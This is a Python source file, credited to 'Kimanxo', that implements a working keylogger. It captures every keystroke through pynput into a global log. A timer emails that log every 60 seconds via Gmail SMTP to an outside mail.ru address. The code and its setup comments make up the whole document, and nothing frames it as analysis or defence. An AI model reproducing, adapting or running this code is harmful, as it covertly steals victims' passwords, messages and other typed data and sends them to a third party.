import pynput.keyboard
import threading
import smtplib
from email.message import EmailMessage
import subprocess
#author : Kimanxo

#importing required modules

log = ""

class Keylogger:

	def press(self, key): #adjusting options 
			global log
			try:
				log = log + str(key.char)
			except AttributeError:
				if key == key.space:
					log = log + " "
				elif key == key.tab:
					log = log +" "
				elif key == key.backspace:
					log = log + " <= "
				elif key == key.alt_l:
					log = log + " "
				elif key == key.shift_l:
					log = log + " "
				elif key == key.caps_lock:
					log = log + " "
				elif key == key.enter:
					log = log + " ENTER "
				elif key == key.shift_r:
					log = log + " "
				elif key == key.esc:
					log = log + " "
				elif key == key.cmd:
					log = log + " "
				elif key == key.alt_gr:
					log = log + " "
				elif key == key.ctrl_l:
					log = log + " "
				elif key == key.ctrl_r:
					log = log + " "
				else:
					log = log + " " + str(key) + " "

	def report(self): # report function [ timing ]
		global log 
		self.send_mail()
		log = ""
		timer = threading.Timer(60, self.report) #specify the period you want 
		timer.start()

	def send_mail(self):
		server = smtplib.SMTP_SSL('smtp.gmail.com', 465) #gmail SMTP settings
		sender = 'example@gmail.com' #put your gmail here 
		server.login(sender, 'yourpassword') #password
		msg = EmailMessage()
		msg['From'] = sender
		msg['To'] = "receiver@mail.ru" # receiver email 
		msg['Subject'] = "LOGS"
		body = (log)
		msg.set_content(body)
		server.send_message(msg)
		server.quit()
# ! Make sure you allow python to use the sender's  gmail (you will find it gmail settings )

	def start(self):
		Listener = pynput.keyboard.Listener(on_press = self.press) 
		with Listener:
			self.report()
			Listener.join()

XLogger = Keylogger()
XLogger.start()
			  

